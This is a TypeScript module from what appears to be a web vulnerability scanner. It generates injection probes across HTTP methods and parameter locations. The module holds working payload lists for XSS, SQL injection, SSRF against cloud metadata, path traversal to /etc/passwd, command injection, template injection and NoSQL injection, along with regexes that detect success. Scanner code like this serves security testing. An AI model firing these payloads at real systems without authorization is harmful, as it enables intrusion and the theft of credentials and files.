// injection-matrix.ts — yields the full (method × location × param × payload)
// probe plan for an endpoint. Kept small and dependency-free.

export type Method = "GET" | "POST" | "PUT" | "PATCH" | "DELETE" | "OPTIONS";
export type Location = "query" | "body_json" | "body_form" | "path" | "header" | "cookie";
export type PayloadClass = "xss" | "sqli" | "ssrf" | "lfi" | "rce" | "ssti" | "nosqli" | "redirect";

export interface Probe {
  method: Method;
  location: Location;
  param: string;
  payload: string;
  payloadClass: PayloadClass;
  proofToken: string;
}

export const PROOF_TOKEN = "CYBERSCOPE_PROVEN";

const PAYLOADS: Record<PayloadClass, string[]> = {
  xss: [
    `"><svg/onload=alert('${PROOF_TOKEN}')>`,
    `<img src=x onerror=alert('${PROOF_TOKEN}')>`,
    `javascript:alert('${PROOF_TOKEN}')`,
    `'-alert('${PROOF_TOKEN}')-'`,
  ],
  sqli: [
    `' OR '1'='1`,
    `1' AND SLEEP(3)-- -`,
    `1)) UNION SELECT '${PROOF_TOKEN}'-- -`,
    `'||(SELECT '${PROOF_TOKEN}')||'`,
  ],
  ssrf: [
    `http://169.254.169.254/latest/meta-data/`,
    `http://127.0.0.1:80/`,
    `file:///etc/passwd`,
  ],
  lfi: [`../../../../etc/passwd`, `..%2f..%2f..%2fetc%2fpasswd`, `/proc/self/environ`],
  rce: [`; echo ${PROOF_TOKEN}`, `| echo ${PROOF_TOKEN}`, `\`echo ${PROOF_TOKEN}\``, `$(echo ${PROOF_TOKEN})`],
  ssti: [`{{7*7}}`, `\${7*7}`, `<%= 7*7 %>`, `#{7*7}`],
  nosqli: [`{"$ne":null}`, `{"$gt":""}`, `{"$where":"sleep(3000)"}`],
  redirect: [`//evil.cyberscope.test`, `https://evil.cyberscope.test`, `/\\evil.cyberscope.test`],
};

const PROOF_MARKERS: Record<PayloadClass, RegExp[]> = {
  xss: [new RegExp(PROOF_TOKEN), /onerror=/i, /<svg/i],
  sqli: [/SQL syntax/i, /mysql_fetch/i, /pg_query/i, /ORA-\d+/i, new RegExp(PROOF_TOKEN)],
  ssrf: [/ami-id/i, /instance-id/i, /root:x:0:0/i, new RegExp(PROOF_TOKEN)],
  lfi: [/root:x:0:0/i, /\[boot loader\]/i],
  rce: [new RegExp(PROOF_TOKEN), /uid=\d+/],
  ssti: [/\b49\b/, /\b14\b/],
  nosqli: [/MongoError/i, /CastError/i],
  redirect: [/Location:\s*\/\/evil\.cyberscope\.test/i],
};

export function detectProof(payloadClass: PayloadClass, status: number, body: string, headers: Headers): boolean {
  const markers = PROOF_MARKERS[payloadClass] || [];
  const headerStr = Array.from(headers.entries()).map(([k, v]) => `${k}: ${v}`).join("\n");
  const blob = body + "\n" + headerStr;
  return markers.some((rx) => rx.test(blob));
}

export interface EndpointSpec {
  url: string;
  queryParams: string[];
  bodyParams: string[];
  headerParams?: string[];
  cookieParams?: string[];
  pathParams?: string[];
}

export function extractParamsFromUrl(url: string): string[] {
  try { return Array.from(new URL(url).searchParams.keys()); } catch { return []; }
}

export function* buildProbes(
  ep: EndpointSpec,
  opts: { classes?: PayloadClass[]; methods?: Method[]; perClassCap?: number } = {},
): Generator<Probe> {
  const classes = opts.classes || (Object.keys(PAYLOADS) as PayloadClass[]);
  const methods: Method[] = opts.methods || ["GET", "POST", "PUT", "PATCH", "DELETE"];
  const cap = opts.perClassCap ?? 3;
  const commonHeaders = ["X-Forwarded-For", "Referer", "User-Agent", "X-Original-URL"];

  for (const method of methods) {
    const validLocs: Location[] = method === "GET" || method === "DELETE" || method === "OPTIONS"
      ? ["query", "header", "path"]
      : ["query", "body_form", "body_json", "header", "path"];

    for (const location of validLocs) {
      let params: string[] = [];
      if (location === "query") params = ep.queryParams.length ? ep.queryParams : ["q", "id", "search"];
      else if (location === "body_form" || location === "body_json") {
        params = ep.bodyParams.length ? ep.bodyParams : (ep.queryParams.length ? ep.queryParams : ["q", "name"]);
      } else if (location === "header") params = ep.headerParams || commonHeaders;
      else if (location === "path") params = ep.pathParams || [];
      else if (location === "cookie") params = ep.cookieParams || [];

      for (const param of params.slice(0, 6)) {
        for (const pc of classes) {
          for (const payload of PAYLOADS[pc].slice(0, cap)) {
            yield { method, location, param, payload, payloadClass: pc, proofToken: PROOF_TOKEN };
          }
        }
      }
    }
  }
}

export function applyProbe(baseUrl: string, p: Probe): { url: string; init: RequestInit } {
  let url = baseUrl;
  const headers: Record<string, string> = { "User-Agent": "CyberScope-Scanner/2.0" };
  let body: BodyInit | undefined;

  if (p.location === "query") {
    try {
      const u = new URL(baseUrl);
      u.searchParams.set(p.param, p.payload);
      url = u.toString();
    } catch { /* ignore */ }
  } else if (p.location === "path") {
    url = baseUrl.replace(/\/$/, "") + "/" + encodeURIComponent(p.payload);
  } else if (p.location === "header") {
    headers[p.param] = p.payload.replace(/[\r\n]/g, "");
  } else if (p.location === "cookie") {
    headers["Cookie"] = `${p.param}=${encodeURIComponent(p.payload)}`;
  } else if (p.location === "body_form") {
    headers["Content-Type"] = "application/x-www-form-urlencoded";
    body = `${encodeURIComponent(p.param)}=${encodeURIComponent(p.payload)}`;
  } else if (p.location === "body_json") {
    headers["Content-Type"] = "application/json";
    body = JSON.stringify({ [p.param]: p.payload });
  }
  return { url, init: { method: p.method, headers, body, redirect: "manual" } };
}
